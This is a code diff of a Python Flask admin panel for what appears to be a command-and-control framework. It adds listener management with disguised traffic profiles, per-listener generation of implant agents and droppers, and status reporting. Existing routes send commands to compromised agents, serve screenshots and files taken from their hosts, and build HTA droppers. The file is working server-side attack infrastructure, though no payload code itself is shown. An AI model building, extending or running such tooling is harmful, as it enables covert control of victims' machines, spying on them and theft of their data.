@@ -7,6 +7,7 @@ import ssl
 import os
 import json
 import re
+import uuid as uuid_lib
 from flask import (
     Flask,
     request,
@@ -23,13 +24,16 @@ from database.operations import AgentDatabase
 from auth.authentication import AuthManager, login_required
 from utils.file_upload import FileUploadManager
 from utils.dropper_generator import DropperGenerator
+from utils.agent_generator import AgentGenerator
+from servers.listener_manager import build_listener_config
 
 
 class AdminServer:
-    def __init__(self, config_loader, logger):
+    def __init__(self, config_loader, logger, listener_manager=None):
         self.app = Flask(__name__, template_folder="../templates")
         self.config_loader = config_loader
         self.logger = logger
+        self.listener_manager = listener_manager
         self.db = AgentDatabase()
         self.auth_manager = AuthManager(config_loader, logger)
         self.upload_manager = FileUploadManager(upload_dir="uploads", logger=logger)
@@ -39,6 +43,10 @@ class AdminServer:
             self.dropper_generator = DropperGenerator(config_loader, logger)
         except Exception as e:
             self.dropper_generator = None
+        try:
+            self.agent_generator = AgentGenerator(config_loader, logger)
+        except Exception as e:
+            self.agent_generator = None
         import os
         self.app.secret_key = os.urandom(24)
         self._setup_middleware()
@@ -47,19 +55,19 @@ class AdminServer:
 
     def _create_ssl_context(self):
         ssl_config = self.config_loader.get_global_ssl_config()
-        
+
         if not ssl_config.get('enabled', False):
             return None
-        
+
         cert_file = ssl_config.get('cert_file')
         key_file = ssl_config.get('key_file')
-        
+
         if not cert_file or not key_file:
             return None
-        
+
         if not os.path.exists(cert_file) or not os.path.exists(key_file):
             return None
-        
+
         try:
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             ssl_version = ssl_config.get('ssl_version', 'TLSv1_2')
@@ -67,17 +75,17 @@ class AdminServer:
                 context.minimum_version = ssl.TLSVersion.TLSv1_3
             elif ssl_version == 'TLSv1_2':
                 context.minimum_version = ssl.TLSVersion.TLSv1_2
-            
+
             ciphers = ssl_config.get('ciphers', 'HIGH:!aNULL:!MD5')
             context.set_ciphers(ciphers)
             context.load_cert_chain(cert_file, key_file)
             context.verify_mode = ssl.CERT_NONE
-            
+
             return context
-            
+
         except Exception as e:
             return None
-            
+
     def _load_command_config(self):
         try:
             config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config", "commands.json")
@@ -98,10 +106,10 @@ class AdminServer:
             if ":" in header:
                 key, value = header.split(":", 1)
                 response.headers[key.strip()] = value.strip()
-        
+
         response.headers['X-Content-Type-Options'] = 'nosniff'
         response.headers['Content-Security-Policy'] = "img-src 'self'"
-        
+
         if response.mimetype == 'image/png' and 'screenshot' in request.path:
             response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
             response.headers['Pragma'] = 'no-cache'
@@ -110,67 +118,105 @@ class AdminServer:
             import time
             etag_base = f"{request.path}:{time.time()}"
             response.headers['ETag'] = hashlib.md5(etag_base.encode()).hexdigest()
-            
+
         return response
 
     def _setup_routes(self):
         @self.app.route("/login", methods=["GET", "POST"])
         def login():
             return self._handle_login()
+
         @self.app.route("/logout")
         def logout():
             return self._handle_logout()
+
         @self.app.route("/")
         @login_required(self.auth_manager)
         def dashboard():
             return self._show_dashboard()
+
         @self.app.route("/api/data")
         @login_required(self.auth_manager)
         def api_data():
             return self._get_api_data()
+
         @self.app.route("/command/<uuid>", methods=["POST"])
         @login_required(self.auth_manager)
         def set_command(uuid):
             return self._set_agent_command(uuid)
+
         @self.app.route("/api/history/<uuid>")
         @login_required(self.auth_manager)
         def api_history(uuid):
             return self._get_command_history(uuid)
+
         @self.app.route("/assets/<path:filename>")
         def serve_assets(filename):
             return self._serve_assets(filename)
-            
+
         @self.app.route("/uploads/<path:filename>")
         @login_required(self.auth_manager)
         def serve_uploads(filename):
             return self._serve_uploads(filename)
-            
+
         @self.app.route("/api/agent/<uuid>", methods=["DELETE"])
         @login_required(self.auth_manager)
         def delete_agent(uuid):
             return self._delete_agent(uuid)
+
         @self.app.route("/status")
         @login_required(self.auth_manager)
         def server_status():
             return self._get_server_status()
-        @self.app.route("/dropper/<server_ip>")
+
+        # ---- Dropper generation (uses listener's upstream_host as server address) ----
+        @self.app.route("/dropper/<listener_id>")
         @login_required(self.auth_manager)
-        def get_dropper_with_ip(server_ip):
-            return self._get_dropper(server_ip)
+        def get_dropper_for_listener(listener_id):
+            return self._get_dropper(listener_id)
+
         @self.app.route("/hta-dropper", methods=["POST"])
         @login_required(self.auth_manager)
         def generate_hta_dropper():
             return self._generate_hta_dropper()
-            
+
         @self.app.route("/api/downloads/list")
         @login_required(self.auth_manager)
         def list_downloads():
             return self._list_downloaded_files()
-            
+
         @self.app.route("/api/downloads/delete/<filename>", methods=["DELETE"])
         @login_required(self.auth_manager)
         def delete_download(filename):
             return self._delete_downloaded_file(filename)
+
+        # ---- Traffic profiles (from profile.yaml) ----
+        @self.app.route("/api/profiles")
+        @login_required(self.auth_manager)
+        def list_profiles():
+            return self._list_profiles()
+
+        # ---- Listener management ----
+        @self.app.route("/api/listeners", methods=["GET"])
+        @login_required(self.auth_manager)
+        def list_listeners():
+            return self._list_listeners()
+
+        @self.app.route("/api/listeners", methods=["POST"])
+        @login_required(self.auth_manager)
+        def create_listener():
+            return self._create_listener()
+
+        @self.app.route("/api/listeners/<listener_id>", methods=["DELETE"])
+        @login_required(self.auth_manager)
+        def delete_listener(listener_id):
+            return self._delete_listener(listener_id)
+
+        # ---- Agent generation for a specific listener ----
+        @self.app.route("/api/listeners/<listener_id>/agent", methods=["GET"])
+        @login_required(self.auth_manager)
+        def generate_agent_for_listener(listener_id):
+            return self._generate_agent_for_listener(listener_id)
 
     def _setup_error_handlers(self):
         @self.app.errorhandler(404)
@@ -178,11 +224,16 @@ class AdminServer:
             self.logger.log_event(f"404 - Page not found!")
             response = self.app.response_class("", status=404, mimetype="text/plain")
             return self._apply_custom_headers(response)
+
         @self.app.errorhandler(500)
         def internal_error(error):
             self.logger.log_event(f"500 - Internal server error")
             response = self.app.response_class("", status=500, mimetype="text/plain")
             return self._apply_custom_headers(response)
+
+    # ------------------------------------------------------------------
+    # Auth handlers
+    # ------------------------------------------------------------------
 
     def _handle_login(self):
         if request.method == "POST":
@@ -211,6 +262,10 @@ class AdminServer:
     def _show_dashboard(self):
         username = self.auth_manager.get_current_user()
         return render_template("dashboard.html", username=username)
+
+    # ------------------------------------------------------------------
+    # Agent / data
+    # ------------------------------------------------------------------
 
     def _get_api_data(self):
         agents = self.db.get_all_agents()
@@ -283,7 +338,7 @@ class AdminServer:
                 agent_info = f"{agent.get('hostname', 'Unknown')} ({agent.get('username', 'Unknown')})"
                 self.logger.log_event(f"DELETE AGENT - '{username}' deleted agent {uuid[:8]} - {agent_info}")
                 return jsonify({
-                    "success": True, 
+                    "success": True,
                     "message": f"Agent {uuid[:8]} deleted successfully",
                     "deleted_agent": {
                         "uuid": uuid,
@@ -299,34 +354,30 @@ class AdminServer:
             self.logger.log_event(f"DELETE AGENT - Critical error by '{username}': {error_msg}")
             return jsonify({"success": False, "error": error_msg}), 500
 
+    # ------------------------------------------------------------------
+    # Help helpers
+    # ------------------------------------------------------------------
+
     def _generate_help_output(self):
         commands = self.command_config.get("commands", {})
-        
         help_output = "Agent Commands\n"
         help_output += "==============\n"
         help_output += "Command          Description\n"
         help_output += "-------          -----------\n"
-        
         for cmd_name, cmd_info in sorted(commands.items()):
             help_output += f"{cmd_name.ljust(16)} {cmd_info.get('description', '')}\n"
-        
         help_output += "\nNote: Use 'help <command>' for detailed command information."
-        
         return help_output
-        
+
     def _generate_command_help(self, command_name):
         commands = self.command_config.get("commands", {})
-        
         if command_name not in commands:
             return f"Unknown command: {command_name}. Type 'help' for a list of available commands."
-            
         cmd_info = commands[command_name]
-        
         help_output = f"Command: {command_name.upper()}\n"
         help_output += "=" * (len(command_name) + 9) + "\n"
         help_output += f"Description: {cmd_info.get('description', 'No description available.')}\n\n"
         help_output += f"Usage: {cmd_info.get('usage', command_name)}\n\n"
-        
         parameters = cmd_info.get('parameters', [])
         if parameters:
             help_output += "Parameters:\n"
@@ -335,38 +386,35 @@ class AdminServer:
                 help_output += f"  {param.get('name', '').ljust(12)} - {param.get('description', '')} ({required})\n"
         else:
             help_output += "This command has no parameters.\n"
-            
         help_output += "\nTactics: " + cmd_info.get('description', '').split(' ')[-1] if '(' in cmd_info.get('description', '') else ""
-        
         return help_output
-        
+
     def _is_valid_command(self, command_name):
         return command_name in self.command_config.get("commands", {})
-        
+
     def _validate_command_parameters(self, command_name, args):
         commands = self.command_config.get("commands", {})
         if command_name not in commands:
             return f"Unknown command: {command_name}"
-            
         cmd_info = commands[command_name]
         parameters = cmd_info.get('parameters', [])
-        
         if not parameters:
             return None
-            
         required_params = [p for p in parameters if p.get('required', False)]
-        
         if required_params and not args.strip():
             return f"Missing required parameter(s). Usage: {cmd_info.get('usage', command_name)}\nType 'help {command_name}' for more information."
-            
         return None
+
+    # ------------------------------------------------------------------
+    # Static file serving
+    # ------------------------------------------------------------------
 
     def _serve_assets(self, filename):
         try:
             if ".." in filename or filename.startswith("/") or "uploads" in filename:
                 self.logger.log_event(f"SECURITY - Asset directory traversal attempt: {filename}")
                 return "Forbidden", 403
-                
+
             if filename.startswith("css/") and filename.endswith(".css"):
                 return send_from_directory("../templates/assets", filename, mimetype="text/css")
             elif filename.startswith("js/") and filename.endswith(".js"):
@@ -381,20 +429,19 @@ class AdminServer:
                 return "Forbidden", 403
         except FileNotFoundError:
             return f"File not found: /assets/{filename}", 404
-            
+
     def _serve_uploads(self, filename):
         try:
             if ".." in filename or filename.startswith("/"):
                 self.logger.log_event(f"SECURITY - Upload directory traversal attempt: {filename}")
                 return "Forbidden", 403
-            
+
             if filename.lower().startswith('screenshot_') and filename.lower().endswith('.png'):
                 if not session.get('authenticated'):
                     self.logger.log_event(f"SECURITY - Unauthenticated screenshot access attempt: {filename}")
                     return "Unauthorized", 401
-                
                 self.logger.log_event(f"SECURITY - Screenshot accessed by {session.get('username')}: {filename}")
-                
+
             mime_type = None
             if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                 if filename.lower().endswith('.png'):
@@ -403,14 +450,14 @@ class AdminServer:
                     mime_type = 'image/jpeg'
                 elif filename.lower().endswith('.gif'):
                     mime_type = 'image/gif'
-            
+
             self.logger.log_event(f"UPLOAD - File accessed: {filename}")
-            
+
             if mime_type:
                 return send_from_directory("../uploads", filename, mimetype=mime_type)
             else:
                 return send_from_directory("../uploads", filename)
-                
+
         except FileNotFoundError:
             self.logger.log_event(f"UPLOAD - File not found: {filename}")
             return f"File not found: /uploads/{filename}", 404
@@ -418,26 +465,75 @@ class AdminServer:
             self.logger.log_event(f"UPLOAD - Error serving file {filename}: {str(e)}")
             return "Internal Server Error", 500
 
-    def _get_dropper(self, server_ip):
+    # ------------------------------------------------------------------
+    # Dropper / agent generation
+    # ------------------------------------------------------------------
+
+    def _resolve_listener_config(self, listener_id=None):
+        """Return a full listener_config dict for the given listener_id.
+        If listener_id is None, returns the first available listener config.
+        """
+        if listener_id:
+            db_listener = self.db.get_listener_by_id(listener_id)
+            if not db_listener:
+                return None, f"Listener '{listener_id}' not found"
+        else:
+            listeners = self.db.get_all_listeners()
+            if not listeners:
+                return None, "No listeners configured. Create a listener first."
+            db_listener = listeners[0]
+
+        try:
+            listener_config = build_listener_config(db_listener, self.config_loader)
+        except ValueError as e:
+            return None, str(e)
+
+        return listener_config, None
+
+    def _get_dropper(self, listener_id):
         username = self.auth_manager.get_current_user()
         if not self.dropper_generator:
             self.logger.log_event(f"DROPPER - DropperGenerator not initialized")
             return "Internal Server Error - Dropper not available", 500
-        if not server_ip or not server_ip.strip():
-            self.logger.log_event(f"DROPPER - Server IP required")
-            return "Bad Request - IP/host is required. Use: /dropper/YOUR_IP", 400
+
+        listener_config, err = self._resolve_listener_config(listener_id)
+        if err:
+            self.logger.log_event(f"DROPPER - {err}")
+            return f"Bad Request - {err}", 400
+
         try:
-            dropper_content = self.dropper_generator.generate_dropper(server_ip)
+            dropper_content = self.dropper_generator.generate_dropper(listener_config)
             if not dropper_content:
                 self.logger.log_event(f"DROPPER - Generation failed for user {username}")
                 return "Internal Server Error", 500
-            self.logger.log_event(f"DROPPER ADMIN - Dropper delivered to '{username}'")
+            self.logger.log_event(f"DROPPER ADMIN - Dropper delivered to '{username}' (listener: {listener_config['id']})")
             response = self.app.response_class(dropper_content, status=200, mimetype='text/plain')
             response.headers['Content-Type'] = 'text/plain; charset=utf-8'
             return self._apply_custom_headers(response)
         except Exception as e:
             self.logger.log_event(f"DROPPER - Error for user {username}: {str(e)}")
             return f"Internal Server Error: {str(e)}", 500
+
+    def _generate_agent_for_listener(self, listener_id):
+        username = self.auth_manager.get_current_user()
+        if not self.agent_generator:
+            return jsonify({"error": "AgentGenerator not initialized"}), 500
+
+        listener_config, err = self._resolve_listener_config(listener_id)
+        if err:
+            return jsonify({"error": err}), 400
+
+        try:
+            agent_content = self.agent_generator.generate_agent(listener_config)
+            if not agent_content:
+                return jsonify({"error": "Agent generation failed"}), 500
+            self.logger.log_event(f"AGENT GENERATOR - Agent delivered to '{username}' (listener: {listener_id})")
+            response = self.app.response_class(agent_content, status=200, mimetype='text/plain')
+            response.headers['Content-Type'] = 'text/plain; charset=utf-8'
+            return self._apply_custom_headers(response)
+        except Exception as e:
+            self.logger.log_event(f"AGENT GENERATOR - Error for user {username}: {str(e)}")
+            return jsonify({"error": str(e)}), 500
 
     def _generate_hta_dropper(self):
         username = self.auth_manager.get_current_user()
@@ -471,6 +567,155 @@ class AdminServer:
             self.logger.log_event(f"HTA DROPPER - Critical error for user {username}: {str(e)}")
             return jsonify({"error": str(e)}), 500
 
+    # ------------------------------------------------------------------
+    # Traffic profiles
+    # ------------------------------------------------------------------
+
+    def _list_profiles(self):
+        profiles = self.config_loader.get_profiles()
+        result = []
+        for p in profiles:
+            result.append({
+                'id': p.get('id'),
+                'description': p.get('description', ''),
+                'upstream_hosts': p.get('upstream', {}).get('hosts', []),
+                'uris': p.get('http', {}).get('uris', []),
+                'user_agent': p.get('http', {}).get('user_agent', ''),
+            })
+        return jsonify(result)
+
+    # ------------------------------------------------------------------
+    # Listener management
+    # ------------------------------------------------------------------
+
+    def _list_listeners(self):
+        listeners = self.db.get_all_listeners()
+        result = []
+        for l in listeners:
+            entry = dict(l)
+            entry['running'] = (
+                self.listener_manager.is_running(l['id'])
+                if self.listener_manager else False
+            )
+            result.append(entry)
+        return jsonify(result)
+
+    def _create_listener(self):
+        username = self.auth_manager.get_current_user()
+        try:
+            data = request.get_json()
+            if not data:
+                return jsonify({"error": "No data provided"}), 400
+
+            name = data.get('name', '').strip()
+            bind_host = data.get('bind_host', '0.0.0.0').strip()
+            bind_port = data.get('bind_port')
+            protocol = data.get('protocol', 'http').strip().lower()
+            profile_id = data.get('profile_id', '').strip()
+            upstream_host = data.get('upstream_host', '').strip()
+            external_host = data.get('external_host', '').strip()
+
+            if not name:
+                return jsonify({"error": "Listener name is required"}), 400
+            if not bind_port:
+                return jsonify({"error": "Bind port is required"}), 400
+            if not profile_id:
+                return jsonify({"error": "Profile ID is required"}), 400
+            if not upstream_host:
+                return jsonify({"error": "Upstream Host (Host header) is required"}), 400
+            if not external_host:
+                return jsonify({"error": "External Host is required"}), 400
+
+            try:
+                bind_port = int(bind_port)
+            except (ValueError, TypeError):
+                return jsonify({"error": "Bind port must be a number"}), 400
+
+            if bind_port < 1 or bind_port > 65535:
+                return jsonify({"error": "Bind port must be between 1 and 65535"}), 400
+
+            if protocol not in ('http', 'https'):
+                return jsonify({"error": "Protocol must be 'http' or 'https'"}), 400
+
+            # Check profile exists
+            profile = self.config_loader.get_profile_by_id(profile_id)
+            if not profile:
+                return jsonify({"error": f"Profile '{profile_id}' not found in profile.yaml"}), 400
+
+            # Check port uniqueness
+            if self.db.listener_port_in_use(bind_port):
+                return jsonify({"error": f"Port {bind_port} is already used by another listener"}), 409
+
+            listener_id = str(uuid_lib.uuid4())[:8]
+            created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+            listener_data = {
+                'id': listener_id,
+                'name': name,
+                'bind_host': bind_host,
+                'bind_port': bind_port,
+                'protocol': protocol,
+                'profile_id': profile_id,
+                'upstream_host': upstream_host,
+                'external_host': external_host,
+                'created_at': created_at,
+            }
+
+            self.db.create_listener(listener_data)
+
+            # Start the C2 server thread immediately
+            started = False
+            if self.listener_manager:
+                try:
+                    listener_config = build_listener_config(listener_data, self.config_loader)
+                    listener_config['profile'] = profile
+                    started = self.listener_manager.start_listener(listener_config)
+                except Exception as e:
+                    self.logger.log_event(f"LISTENER - Could not start after create: {e}")
+
+            self.logger.log_event(
+                f"LISTENER - '{username}' created listener '{name}' "
+                f"({protocol.upper()}://0.0.0.0:{bind_port}, profile: {profile_id})"
+            )
+
+            return jsonify({
+                "success": True,
+                "listener": {**listener_data, "running": started}
+            }), 201
+
+        except Exception as e:
+            self.logger.log_event(f"LISTENER - Create error by '{username}': {str(e)}")
+            return jsonify({"error": str(e)}), 500
+
+    def _delete_listener(self, listener_id):
+        username = self.auth_manager.get_current_user()
+        try:
+            listener = self.db.get_listener_by_id(listener_id)
+            if not listener:
+                return jsonify({"error": "Listener not found"}), 404
+
+            if self.listener_manager:
+                self.listener_manager.stop_listener(listener_id)
+
+            deleted = self.db.delete_listener(listener_id)
+            if deleted:
+                self.logger.log_event(
+                    f"LISTENER - '{username}' deleted listener '{listener['name']}' (id: {listener_id})"
+                )
+                return jsonify({
+                    "success": True,
+                    "message": f"Listener '{listener['name']}' deleted and stopped."
+                }), 200
+            else:
+                return jsonify({"error": "Failed to delete listener"}), 500
+        except Exception as e:
+            self.logger.log_event(f"LISTENER - Delete error by '{username}': {str(e)}")
+            return jsonify({"error": str(e)}), 500
+
+    # ------------------------------------------------------------------
+    # Server status
+    # ------------------------------------------------------------------
+
     def _get_server_status(self):
         agent_count = self.db.get_agent_count()
         events_count = self.logger.get_events_count()
@@ -478,6 +723,7 @@ class AdminServer:
         dropper_stats = None
         if self.dropper_generator:
             dropper_stats = self.dropper_generator.get_dropper_stats()
+        listener_count = len(self.db.get_all_listeners())
         return jsonify(
             {
                 "status": "online",
@@ -485,12 +731,17 @@ class AdminServer:
                 "events_count": events_count,
                 "upload_stats": upload_stats,
                 "dropper_stats": dropper_stats,
+                "listener_count": listener_count,
                 "timestamp": datetime.now().isoformat(),
                 "user": self.auth_manager.get_current_user(),
                 "server_type": "admin",
                 "ssl_enabled": self.ssl_context is not None,
             }
         )
+
+    # ------------------------------------------------------------------
+    # Downloads
+    # ------------------------------------------------------------------
 
     def _list_downloaded_files(self):
         try:
@@ -499,40 +750,44 @@ class AdminServer:
         except Exception as e:
             self.logger.log_event(f"ERROR - Failed to list downloaded files: {str(e)}")
             return jsonify({"error": str(e)}), 500
-            
+
     def _delete_downloaded_file(self, filename):
         try:
             if not self._is_safe_filename(filename):
                 self.logger.log_event(f"SECURITY - Attempted path traversal in file delete: {filename}")
                 return jsonify({"success": False, "error": "Invalid filename"}), 400
-                
+
             file_path = os.path.join("uploads", filename)
-            
+
             if not os.path.exists(file_path):
                 return jsonify({"success": False, "error": "File not found"}), 404
-                
+
             os.remove(file_path)
             self.logger.log_event(f"File deleted: {filename}")
-            
+
             return jsonify({"success": True, "message": f"File {filename} deleted successfully"})
         except Exception as e:
             self.logger.log_event(f"ERROR - Failed to delete file {filename}: {str(e)}")
             return jsonify({"success": False, "error": str(e)}), 500
-            
+
     def _is_safe_filename(self, filename):
         return not (
-            ".." in filename 
-            or filename.startswith("/") 
+            ".." in filename
+            or filename.startswith("/")
             or filename.startswith("\\")
             or ":" in filename
             or "\\" in filename
         )
 
+    # ------------------------------------------------------------------
+    # Flask run
+    # ------------------------------------------------------------------
+
     def run(self, host, port):
         from werkzeug.serving import WSGIRequestHandler
         WSGIRequestHandler.server_version = ""
         WSGIRequestHandler.sys_version = ""
-        
+
         if self.ssl_context:
             self.app.run(host=host, port=port, debug=False, use_reloader=False, ssl_context=self.ssl_context)
         else:
